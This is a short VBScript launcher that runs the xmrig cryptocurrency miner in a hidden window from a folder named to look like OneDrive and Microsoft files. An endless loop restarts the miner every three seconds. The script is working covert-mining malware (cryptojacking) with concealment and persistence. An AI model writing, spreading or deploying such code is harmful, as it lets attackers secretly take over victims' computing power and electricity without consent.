Set WshShell = CreateObject("WScript.Shell")

Do
    WshShell.Run """C:\Backups\OneDrive\imp\Ai-Microsoft\xmrig.exe""", 0, True
    ' Wait 3 seconds before restarting (avoid CPU overuse)
    WScript.Sleep 3000
Loop